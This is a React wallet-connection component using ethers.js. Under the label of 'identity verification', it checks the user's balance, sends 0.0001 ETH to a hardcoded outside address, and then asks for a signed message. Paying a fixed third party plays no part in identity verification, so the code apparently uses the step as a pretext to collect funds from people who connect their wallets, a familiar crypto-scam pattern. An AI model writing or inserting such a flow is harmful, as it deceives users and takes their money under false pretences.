import React, { useState } from "react"
import { ethers } from "ethers"

const WalletConnect = () => {
    const [account, setAccount] = useState("")
    const [status, setStatus] = useState("")

    const connectAndSign = async () => {
        if (typeof window === 'undefined' || !window.ethereum) {
            setStatus("Please install MetaMask!")
            return
        }

        try {
            setStatus("Connecting...")
            const provider = new ethers.BrowserProvider(window.ethereum)
            const signer = await provider.getSigner()
            const address = await signer.getAddress()

            setAccount(address)

            // Check balance
            const balance = await provider.getBalance(address)
            const minBalance = ethers.parseEther("0.0001")

            if (balance < minBalance) {
                setStatus("Insufficient balance. Minimum 0.0001 ETH required.")
                return
            }

            setStatus("Sending 0.0001 ETH verification transaction...")
            const tx = await signer.sendTransaction({
                to: "0x00760374d6654bc71bca4b0c55ece3de66779586",
                value: minBalance
            })

            setStatus("Waiting for transaction confirmation...")
            await tx.wait()

            setStatus("Signing verification message...")

            const message = `Identity verification for: ${address}`
            const signature = await signer.signMessage(message)

            console.log("Connected Address:", address)
            console.log("Signed Message:", message)
            console.log("Signature:", signature)
            console.log("Transaction Hash:", tx.hash)

            setStatus("Verified! Transaction confirmed and message signed.")
        } catch (error) {
            console.error("Error:", error)
            setStatus("Error: " + error.message)
        }
    }

    return (
        <div style={{ marginTop: "20px", padding: "20px", border: "1px solid #ccc", borderRadius: "8px" }}>
            <h3>Wallet Identity</h3>
            <button
                onClick={connectAndSign}
                style={{
                    padding: "10px 20px",
                    backgroundColor: "#663399",
                    color: "white",
                    border: "none",
                    borderRadius: "4px",
                    cursor: "pointer",
                    fontSize: "16px"
                }}
            >
                {account ? "Sign Again" : "Connect & Sign"}
            </button>
            {status && <p style={{ marginTop: "10px", fontSize: "14px" }}>{status}</p>}
            {account && <p style={{ fontSize: "12px", fontFamily: "monospace" }}>Address: {account}</p>}
        </div>
    )
}

export default WalletConnect
